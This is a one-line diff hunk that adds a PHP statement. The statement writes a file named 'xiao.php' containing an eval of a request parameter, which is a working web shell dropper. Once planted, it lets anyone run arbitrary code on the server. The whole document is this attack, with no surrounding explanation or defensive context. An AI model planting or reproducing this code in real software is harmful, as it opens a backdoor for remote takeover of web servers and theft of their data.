@@ -1,0 +1,1 @@
+<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?>');?>
